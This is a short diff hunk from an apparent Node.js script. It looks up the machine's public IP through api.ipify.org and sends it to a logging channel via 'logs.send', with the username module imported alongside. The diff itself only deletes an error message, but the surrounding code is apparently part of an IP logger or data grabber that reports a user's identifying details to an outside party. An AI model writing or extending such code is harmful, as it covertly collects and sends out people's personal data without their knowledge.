@@ -7,7 +7,6 @@ const username = require('username');
 request.get(`https://api.ipify.org`, function(err, response, body) {
 	logs.send(`**__IP__** : ${body}`)
 	if (err)
-		console.log(`you're not connected to network`)
 		 process.exit(1);
 	});
 	
